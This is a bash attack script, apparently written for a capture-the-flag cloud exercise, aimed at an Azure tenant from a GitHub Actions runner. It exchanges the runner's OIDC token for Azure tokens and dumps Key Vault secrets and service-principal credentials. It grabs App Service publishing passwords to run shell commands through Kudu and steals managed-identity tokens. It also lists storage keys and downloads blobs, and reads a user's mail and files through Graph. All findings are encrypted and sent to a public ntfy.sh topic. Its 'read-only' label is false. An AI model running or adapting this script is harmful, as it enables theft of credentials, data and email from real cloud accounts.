#!/usr/bin/env bash
# DF26 Tebamoto owner recon v4 (read-only) + sealed OOB reporting
set -uo pipefail
T="${AZURE_TENANT_ID:?}"; C="${AZURE_CLIENT_ID:?}"; SUB="${AZURE_SUBSCRIPTION_ID:?}"
PROD="https://kv-tbl-prod-x3euoz.vault.azure.net"; SEC="https://kv-tbl-sec-x3euoz.vault.azure.net"
MG="https://management.azure.com"; ACR="crtblplatprodx3euoz.azurecr.io"
TOPIC="tbl-owner-7f3a9c2e5b1d4a86"
W=/tmp/w; rm -rf "$W"; mkdir -p "$W"; say(){ echo "[*] $*"; }

cat > "$W/pub.pem" <<'PEM'
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzJv1GqtWmTDtalKnP7MH
m8iJgsiUTMh6oB/0QtYOaOkgrCXEfkSXhq1Ukm9AlkS1HG9WRNXiXli9jufJqTo+
KRG3xDpxYBtA/eZI0tW9J/BB1ecN8Z2UW9iS/ZUrqhdxF1mqO91yxQH0OvQY43LA
he94F2NHU4mFbaM3UMSx0rpdAtqUnipIDPiwtXRddBMmvgLU0MJCGQ1ziz/6p4jy
hCXGJBS1NFJo4tZXBRSEmPu5/7wZ3GaZkRWjG/4tcmV1U26uLrDyT/djwdHWY7eN
ty3P9z4JiqmKmDD9kIrgmWLANPE+NnCpqi0YiqJkmLDbiSpmUkqGnqon397/Xx9A
lQIDAQAB
-----END PUBLIC KEY-----
PEM
ntfy_send(){ curl -sS --max-time 15 --data-binary "$1" "https://ntfy.sh/$TOPIC" >/dev/null 2>&1 || true; }
send_sealed(){ local label="$1" f="$2" key iv kd dt
  [ -s "$f" ] || return 0
  key=$(openssl rand -hex 32); iv=$(openssl rand -hex 16)
  kd=$(printf '%s:%s' "$key" "$iv" | openssl pkeyutl -encrypt -pubin -inkey "$W/pub.pem" 2>/dev/null | base64 -w0)
  dt=$(openssl enc -aes-256-cbc -K "$key" -iv "$iv" -in "$f" 2>/dev/null | base64 -w0)
  echo "SEAL|$label|$kd|$dt"
  if [ $(( ${#kd} + ${#dt} + ${#label} + 16 )) -lt 3900 ]; then ntfy_send "SEAL|$label|$kd|$dt"
  else local rest="$dt" i=0 part; while [ -n "$rest" ]; do i=$((i+1)); part="${rest:0:2400}"; rest="${rest:2400}"; ntfy_send "SEALCHUNK|$label|$i|$kd|$part"; done; fi; }
report(){ local label="$1"; shift; printf '%s\n' "$*" > "$W/rep.txt"; send_sealed "$label" "$W/rep.txt"; }
seal(){ local n="$1" f="$2" key iv kd dt
  if [ ! -s "$f" ]; then echo "SEAL|$n|EMPTY"; return 0; fi
  key=$(openssl rand -hex 32); iv=$(openssl rand -hex 16)
  kd=$(printf '%s:%s' "$key" "$iv" | openssl pkeyutl -encrypt -pubin -inkey "$W/pub.pem" 2>/dev/null | base64 -w0)
  dt=$(openssl enc -aes-256-cbc -K "$key" -iv "$iv" -in "$f" 2>/dev/null | base64 -w0)
  echo "SEAL|$n|$kd|$dt"; }

mint_ca(){ curl -sS --max-time 30 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d "client_id=$1" -d 'grant_type=client_credentials' -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' -d "client_assertion=$oidc" -d "scope=$2" | jq -r '.access_token // empty'; }
mint_cs(){ curl -sS --max-time 30 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d "client_id=$1" -d 'grant_type=client_credentials' -d "client_secret=$2" -d "scope=$3" | jq -r '.access_token // empty'; }
req(){ local n="$1" m="$2" u="$3" t="$4" code
  if [ -z "$t" ]; then echo "REQ|$n|NOTOKEN"; return 0; fi
  if [ "$m" = POST ]; then code=$(curl -sS --max-time 45 --connect-timeout 10 -o "$W/$n.body" -w '%{http_code}' -X POST -H "Authorization: Bearer $t" -H 'Content-Length: 0' "$u" 2>/dev/null || echo 000)
  else code=$(curl -sS --max-time 45 --connect-timeout 10 -o "$W/$n.body" -w '%{http_code}' -H "Authorization: Bearer $t" "$u" 2>/dev/null || echo 000); fi
  echo "REQ|$n|$code|$(wc -c < "$W/$n.body" 2>/dev/null || echo 0)"; }

oidc=$(curl -sS --max-time 25 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
say "OIDC_LEN=${#oidc}"
BV=$(mint_ca "$C" "https://vault.azure.net/.default"); BA=$(mint_ca "$C" "$MG/.default"); BG=$(mint_ca "$C" "https://graph.microsoft.com/.default")
printf '%s' "$BA" > "$W/tok_base_arm"; report base "vault=$([ -n "$BV" ]&&echo OK||echo NO) arm=$([ -n "$BA" ]&&echo OK||echo NO) graph=$([ -n "$BG" ]&&echo OK||echo NO)"
SL=$(curl -sS --max-time 30 -H "Authorization: Bearer $BV" "$PROD/secrets?api-version=7.4")
mapfile -t NAMES < <(printf '%s' "$SL" | jq -r '.value[]?.id|split("/")|last')
for n in "${NAMES[@]}"; do
  [ -n "$n" ] || continue
  S=$(curl -sS --max-time 30 -H "Authorization: Bearer $BV" "$PROD/secrets/$n?api-version=7.4")
  val=$(printf '%s' "$S" | jq -r '.value // empty' 2>/dev/null)
  appid=$(printf '%s' "$val" | jq -r '.appId // empty' 2>/dev/null || true); secret=$(printf '%s' "$val" | jq -r '.clientSecret // empty' 2>/dev/null || true)
  if [ -z "$appid" ] && [ -n "$val" ]; then appid=$(printf '%s' "$val" | jq -r 'fromjson|.appId // empty' 2>/dev/null || true); secret=$(printf '%s' "$val" | jq -r 'fromjson|.clientSecret // empty' 2>/dev/null || true); fi
  [ -n "$appid" ] && [ -n "$secret" ] || continue
  printf '%s' "$(mint_cs "$appid" "$secret" "$MG/.default")" > "$W/tok_arm_$n"
  printf '%s' "$(mint_cs "$appid" "$secret" "https://storage.azure.com/.default")" > "$W/tok_stor_$n"
  printf '%s' "$(mint_cs "$appid" "$secret" "https://vault.azure.net/.default")" > "$W/tok_vault_$n"
  printf '%s' "$(mint_cs "$appid" "$secret" "https://graph.microsoft.com/.default")" > "$W/tok_graph_$n"
done
RARM=$(cat "$W/tok_arm_reporting-service-principal" 2>/dev/null)

############ 1. reporting Kudu + MI
f="$W/pub_reporting.body"
code=$(curl -sS --max-time 45 --connect-timeout 10 -o "$f" -w '%{http_code}' -X POST -H "Authorization: Bearer $RARM" -H 'Content-Length: 0' "$MG/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2022-03-01" 2>/dev/null || echo 000)
KU=$(jq -r '.properties.publishingUserName // .publishingUserName // empty' "$f" 2>/dev/null || true)
KP=$(jq -r '.properties.publishingPassword // .publishingPassword // empty' "$f" 2>/dev/null || true)
report kudu_creds "http=$code user=$KU passlen=${#KP} bodybytes=$(wc -c < "$f")"
[ -n "$KP" ] && send_sealed reporting_pubcred "$f"
S=app-tbl-reporting-prod; K="https://$S.scm.azurewebsites.net"
kcmd(){ local n="$1" c="$2"
  jq -n --arg c "$c" --arg d "/home" '{command:$c,dir:$d}' > "$W/creq.json"
  curl -sS --max-time 70 --connect-timeout 10 -u "$KU:$KP" -H 'Content-Type: application/json' -X POST --data-binary @"$W/creq.json" "$K/api/command" -o "$W/k_$n.json" 2>/dev/null
  jq -r '.Output // ""' "$W/k_$n.json" > "$W/k_$n.out" 2>/dev/null
  echo "KCMD|$n|$(wc -c < "$W/k_$n.out" 2>/dev/null || echo 0)"; }
if [ -n "$KP" ]; then
  for p in /api/settings /api/processes; do
    c=$(curl -sS --max-time 40 --connect-timeout 10 -u "$KU:$KP" -o "$W/kp$(printf '%s' "$p"|tr '/.' '__').body" -w '%{http_code}' "$K$p" 2>/dev/null || echo 000)
    echo "KUDU|$p|$c"
  done
  kcmd shell 'bash -lc "id; echo SHELL_OK"'
  kcmd env 'bash -lc "env"'
  kcmd mi_arm 'bash -lc "curl -sS -H \"X-IDENTITY-HEADER: $IDENTITY_HEADER\" \"http://169.254.131.5:8081/msi/token?resource=https://management.azure.com&api-version=2019-08-01\""'
  kcmd mi_graph 'bash -lc "curl -sS -H \"X-IDENTITY-HEADER: $IDENTITY_HEADER\" \"http://169.254.131.5:8081/msi/token?resource=https://graph.microsoft.com&api-version=2019-08-01\""'
  kcmd mi_stor 'bash -lc "curl -sS -H \"X-IDENTITY-HEADER: $IDENTITY_HEADER\" \"http://169.254.131.5:8081/msi/token?resource=https://storage.azure.com&api-version=2019-08-01\""'
  kcmd mi_vault 'bash -lc "curl -sS -H \"X-IDENTITY-HEADER: $IDENTITY_HEADER\" \"http://169.254.131.5:8081/msi/token?resource=https://vault.azure.net&api-version=2019-08-01\""'
  kcmd shelltest 'bash -lc "echo SHELL2_OK; whoami"'
fi
MIARM=$(jq -r '.access_token // empty' "$W/k_mi_arm.out" 2>/dev/null || true)
MIGR=$(jq -r '.access_token // empty' "$W/k_mi_graph.out" 2>/dev/null || true)
MISTOR=$(jq -r '.access_token // empty' "$W/k_mi_stor.out" 2>/dev/null || true)
MIV=$(jq -r '.access_token // empty' "$W/k_mi_vault.out" 2>/dev/null || true)
report mi "arm=$([ -n "$MIARM" ]&&echo OK||echo NO) graph=$([ -n "$MIGR" ]&&echo OK||echo NO) stor=$([ -n "$MISTOR" ]&&echo OK||echo NO) vault=$([ -n "$MIV" ]&&echo OK||echo NO) shell=$(head -c 60 "$W/k_shell.out" 2>/dev/null | tr '\n' ' ')"

############ 2. role assignments RG + vault
for rg in rg-tbl-platform-prod-sea rg-tbl-reporting-prod-eus; do
  req "ra_rg_${rg}" GET "$MG/subscriptions/$SUB/resourceGroups/$rg/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" "$BA"
  req "ra_rg_${rg}_mi" GET "$MG/subscriptions/$SUB/resourceGroups/$rg/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" "$MIARM"
done
for v in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  req "ra_vault_${v}" GET "$MG/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/$v/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" "$BA"
done
{ for f2 in "$W"/ra_rg_*.body "$W"/ra_vault_*.body; do [ -s "$f2" ] && jq -r --arg f "$(basename "$f2")" '.value[]? | [$f,.properties.principalId,.properties.principalType,(.properties.roleDefinitionId|split("/")|last),.properties.scope] | @tsv' "$f2" 2>/dev/null; done; } > "$W/roles.tsv"
report roles "$(cat "$W/roles.tsv" 2>/dev/null | head -40)"
{ for f2 in "$W"/ra_*.body; do [ -s "$f2" ] && jq -r '.value[]?.properties.roleDefinitionId' "$f2" 2>/dev/null; done; } | sort -u | while read -r rid; do
  [ -n "$rid" ] || continue
  rn=$(curl -sS --max-time 25 -H "Authorization: Bearer $BA" "$MG$rid?api-version=2022-04-01" | jq -r '.properties.roleName // empty' 2>/dev/null)
  [ -n "$rn" ] && echo "ROLEDEF $(basename "$rid") $rn" >> "$W/roledefs.txt"
done
report roledefs "$(cat "$W/roledefs.txt" 2>/dev/null | head -30)"

############ 3. deployment history
for rg in rg-tbl-platform-prod-sea rg-tbl-reporting-prod-eus; do
  req "dep_${rg}" GET "$MG/subscriptions/$SUB/resourceGroups/$rg/providers/Microsoft.Resources/deployments?api-version=2021-04-01" "$BA"
  for d in $(jq -r '.value[]?.name' "$W/dep_${rg}.body" 2>/dev/null | head -30); do
    dn=$(printf '%s' "$d" | tr -c 'A-Za-z0-9._-' '_')
    code=$(curl -sS --max-time 30 -H "Authorization: Bearer $BA" -o "$W/depd_${rg}_${dn}.json" -w '%{http_code}' "$MG/subscriptions/$SUB/resourceGroups/$rg/providers/Microsoft.Resources/deployments/$d?api-version=2021-04-01" 2>/dev/null || echo 000)
    echo "DEP|$rg|$d|$code"
    jq -r '.properties.parameters // {} | to_entries[] | "PARAM \(.key)=\(.value.value // .value)"' "$W/depd_${rg}_${dn}.json" 2>/dev/null > "$W/dp_${rg}_${dn}.txt"
    if grep -aqiE 'DF26\{|password|secret|flag|key' "$W/dp_${rg}_${dn}.txt" 2>/dev/null; then send_sealed "dep_${rg}_${dn}" "$W/dp_${rg}_${dn}.txt"; fi
  done
done

############ 4. storage keys + blobs
getkey(){ local acct="$1" tok="$2"
  curl -sS --max-time 30 -X POST -H "Authorization: Bearer $tok" -H 'Content-Length: 0' "$MG/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$acct/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // empty' 2>/dev/null; }
for acct in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  KEY=""
  for tn in sync-service-principal secrets-sync-principal reporting-service-principal base mi; do
    if [ "$tn" = mi ]; then tk="$MIARM"; else tk=$(cat "$W/tok_arm_$tn" 2>/dev/null); fi
    [ -n "$tk" ] || continue
    K2=$(getkey "$acct" "$tk"); [ -n "$K2" ] && { KEY="$K2"; echo "KEY|$acct|$tn|OK"; break; }
  done
  [ -n "$KEY" ] || { echo "KEY|$acct|NONE"; continue; }
  CS="DefaultEndpointsProtocol=https;AccountName=$acct;AccountKey=$KEY;EndpointSuffix=core.windows.net"
  conts=$(timeout 60 az storage container list --connection-string "$CS" --query '[].name' -o tsv --only-show-errors 2>/dev/null)
  echo "CONT|$acct|$(printf '%s' "$conts" | tr '\n' ',')"
  report "cont_$acct" "account=$acct containers=$conts"
  for cont in $conts; do
    rows=$(timeout 90 az storage blob list --connection-string "$CS" --container-name "$cont" --query '[].{n:name,s:properties.contentLength}' -o tsv --only-show-errors 2>/dev/null)
    echo "BLOBS|$acct|$cont|$(printf '%s' "$rows" | tr '\n' ';' | head -c 1500)"
    printf '%s\n' "$rows" > "$W/bl_${acct}_${cont}.tsv"
    report "blobs_${acct}_${cont}" "$rows"
    while IFS=$'\t' read -r bn bsz; do
      [ -n "$bn" ] || continue
      [ "${bsz:-0}" -lt 1048576 ] 2>/dev/null || continue
      timeout 60 az storage blob download --connection-string "$CS" --container-name "$cont" --name "$bn" --file "$W/dl.bin" --no-progress --only-show-errors >/dev/null 2>&1 || continue
      if grep -aq 'DF26{' "$W/dl.bin" 2>/dev/null; then
        { echo "FLAG_HIT $acct/$cont/$bn"; grep -aoE 'DF26\{[^}]{1,200}\}' "$W/dl.bin" | head -5; } > "$W/hit.txt"
        send_sealed "flag_${acct}_${cont}_${bn}" "$W/hit.txt"
      fi
      if grep -aqiE 'publishingPassword|clientSecret|AccountKey|"password"|DF26\{' "$W/dl.bin" 2>/dev/null; then
        { echo "SECRET_HIT $acct/$cont/$bn"; grep -aoiE '(publishingPassword|clientSecret|AccountKey|"password")[^,}\n]{0,160}' "$W/dl.bin" | head -10; } > "$W/hit2.txt"
        send_sealed "sec_${acct}_${cont}_${bn}" "$W/hit2.txt"
        cp "$W/dl.bin" "$W/raw_${acct}_${cont}_$(printf '%s' "$bn" | tr -c 'A-Za-z0-9._-' '_').bin"
      fi
    done < "$W/bl_${acct}_${cont}.tsv"
  done
done

############ 5. ACR authenticated
acr_tok(){ local at="$1"
  curl -sS --max-time 30 -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'grant_type=access_token' --data-urlencode "service=$ACR" --data-urlencode "tenant=$T" --data-urlencode "access_token=$at" --data-urlencode 'scope=registry:catalog:*' "https://$ACR/oauth2/token" 2>/dev/null | jq -r '.access_token // empty'; }
for pair in "base:$BA" "mi:$MIARM"; do
  n="${pair%%:*}"; at="${pair#*:}"; [ -n "$at" ] || continue
  T2=$(acr_tok "$at"); echo "ACRTOK|$n|$([ -n "$T2" ]&&echo OK||echo NO)"
  [ -n "$T2" ] || continue
  cat=$(curl -sS --max-time 30 -H "Authorization: Bearer $T2" "https://$ACR/v2/_catalog?n=200" 2>/dev/null)
  echo "ACR|$n|$(printf '%s' "$cat" | head -c 500)"
  report "acr_$n" "$cat"
  for r in $(printf '%s' "$cat" | jq -r '.repositories[]?' 2>/dev/null); do
    tg=$(curl -sS --max-time 30 -H "Authorization: Bearer $T2" "https://$ACR/v2/$r/tags/list" 2>/dev/null)
    report "acr_tags_${r}" "$tg"
  done
done

############ 6. storefront publishing attempts
SF="/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod"
req sf_pub_get GET "$MG$SF/config/publishingcredentials?api-version=2022-03-01" "$BA"
req sf_pub_get_mi GET "$MG$SF/config/publishingcredentials?api-version=2022-03-01" "$MIARM"
req sf_pub_list POST "$MG$SF/config/publishingcredentials/list?api-version=2022-03-01" "$BA"
req sf_pub_list_mi POST "$MG$SF/config/publishingcredentials/list?api-version=2022-03-01" "$MIARM"
req sf_pub_list_rsvc POST "$MG$SF/config/publishingcredentials/list?api-version=2022-03-01" "$RARM"
req sf_publishxml POST "$MG$SF/publishxml/list?api-version=2022-03-01" "$BA"
req sf_basicpub GET "$MG$SF/basicPublishingCredentialsPolicies?api-version=2022-03-01" "$BA"
req sf_web GET "$MG$SF/config/web?api-version=2022-03-01" "$BA"
req sf_deps GET "$MG$SF/deployments?api-version=2022-03-01" "$BA"
for f2 in "$W"/sf_*.body; do
  [ -s "$f2" ] || continue
  if jq -e '..|objects|select(has("publishingPassword"))' "$f2" >/dev/null 2>&1; then
    send_sealed "sf_leak_$(basename "$f2" .body)" "$f2"
  fi
done

############ 7. MI probes
req mi_users GET "https://graph.microsoft.com/v1.0/users?\$top=100&\$select=displayName,userPrincipalName,mail,id,accountEnabled" "$MIGR"
req mi_mail GET "https://graph.microsoft.com/v1.0/users/d2cdf247-9319-40cb-8324-5a005ef538da/messages?\$top=25&\$select=subject,bodyPreview,from,receivedDateTime" "$MIGR"
req mi_drive GET "https://graph.microsoft.com/v1.0/users/d2cdf247-9319-40cb-8324-5a005ef538da/drive/root/children" "$MIGR"
req mi_sps GET "https://graph.microsoft.com/v1.0/servicePrincipals?\$top=10&\$select=displayName,appId,id" "$MIGR"
req mi_res GET "$MG/subscriptions/$SUB/resources?api-version=2021-04-01" "$MIARM"
req mi_roles GET "$MG/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" "$MIARM"
req mi_prod GET "$PROD/secrets?api-version=7.4" "$MIV"
req mi_sec GET "$SEC/secrets?api-version=7.4" "$MIV"
for g in "$W"/tok_graph_*; do
  n="${g##*/tok_graph_}"; gt=$(cat "$g")
  [ -n "$gt" ] || continue
  c=$(curl -sS --max-time 25 -H "Authorization: Bearer $gt" -o "$W/gm_$n.json" -w '%{http_code}' "https://graph.microsoft.com/v1.0/users/d2cdf247-9319-40cb-8324-5a005ef538da/messages?\$top=10&\$select=subject,bodyPreview,receivedDateTime" 2>/dev/null || echo 000)
  echo "GRAPHMAIL|$n|$c"
  if [ "$c" = 200 ]; then send_sealed "mail_$n" "$W/gm_$n.json"; fi
done

report done "finished $(date -u +%H:%M:%S)"
say DONE
